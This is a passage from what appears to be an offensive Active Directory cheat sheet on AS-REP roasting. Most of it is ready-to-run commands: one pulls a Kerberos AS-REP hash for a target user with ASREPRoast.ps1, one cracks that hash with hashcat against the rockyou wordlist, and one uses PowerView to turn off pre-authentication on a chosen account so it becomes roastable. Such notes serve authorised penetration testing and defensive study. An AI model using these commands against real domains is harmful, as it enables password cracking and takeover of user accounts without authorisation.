Get the hash for a roastable user (see above for hunting). Using `ASREPRoast.ps1`:

```powershell
Get-ASREPHash -UserName TargetUser
```
Crack the hash with Hashcat:

```bash
hashcat -a 0 -m 18200 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
```
#### Targeted AS-REP roasting by disabling Kerberos pre-authentication

Again, we need ACL write permissions to set UserAccountControl flags for the target user. Using PowerView:

```powershell
Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304}
```